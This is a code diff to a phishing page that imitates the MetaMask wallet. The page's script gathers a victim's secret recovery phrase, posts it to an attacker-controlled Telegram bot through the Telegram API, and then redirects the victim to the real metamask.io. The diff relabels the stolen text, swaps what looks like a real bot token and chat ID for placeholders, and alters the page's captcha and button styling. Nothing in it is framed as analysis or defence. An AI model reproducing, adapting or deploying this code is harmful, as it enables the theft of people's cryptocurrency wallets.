@@ -129,7 +129,7 @@
       font-size: 14px;
     }
     .submit-btn {
-      background: linear-gradient(90deg, #537cff, #6563ff);
+      background: linear-gradient(90deg, #ff4b2b, #ff416c);
       border: none;
       color: white;
       width: 100%;
@@ -152,7 +152,7 @@
     }
     .captcha-container {
       margin-top: 20px;
-      display: none; /* caché par défaut */
+      display: none;
       flex-direction: column;
       align-items: flex-start;
       gap: 8px;
@@ -186,7 +186,7 @@
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -228,7 +228,7 @@
 
       <div class="captcha-container" id="captchaContainer">
         <label class="captcha-label" id="captchaQuestion" for="captchaInput">Please solve:</label>
-        <input class="captcha-input" id="captchaInput" type="number" autocomplete="off" />
+        <input class="captcha-input" id="captchaInput" type="text" autocomplete="off" />
       </div>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
@@ -247,13 +247,15 @@
     const captchaQuestion = document.getElementById("captchaQuestion");
     const errorMsg = document.getElementById("errorMsg");
 
-    let captchaAnswer = null;
+    let captchaAnswer = "";
 
     function generateCaptcha() {
-      const num1 = Math.floor(Math.random() * 10) + 1; // 1 to 10
-      const num2 = Math.floor(Math.random() * 10) + 1;
-      captchaAnswer = num1 + num2;
-      captchaQuestion.textContent = `Please solve: ${num1} + ${num2} =`;
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      captchaAnswer = "";
+      for (let i = 0; i < 5; i++) {
+        captchaAnswer += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      captchaQuestion.textContent = `Please solve: ${captchaAnswer}`;
       captchaInput.value = "";
     }
 
@@ -313,9 +315,8 @@
     }
 
     function checkCaptcha() {
-      const answer = captchaInput.value.trim();
-      const isCorrect = parseInt(answer) === captchaAnswer;
-
+      const answer = captchaInput.value.trim().toUpperCase();
+      const isCorrect = answer === captchaAnswer;
       submitBtn.disabled = !isCorrect;
     }
 
@@ -354,22 +355,22 @@
         phrase += value.trim() + " ";
       }
 
-      const botToken = "8006898547:AAG1uCG4idpvvl6rbDGJ-Dx5-nbN0og-kEs"; // Remplace ici
-      const chatId = "6996434307";     // Remplace ici
+      const botToken = "YOUR_BOT_TOKEN_HERE";
+      const chatId = "YOUR_CHAT_ID_HERE";
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text:"\n" + phrase.trim()
+          text: "Secret Recovery Phrase:\n" + phrase.trim()
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+        window.location.href = "https://metamask.io/";
       }, 800);
     }
 
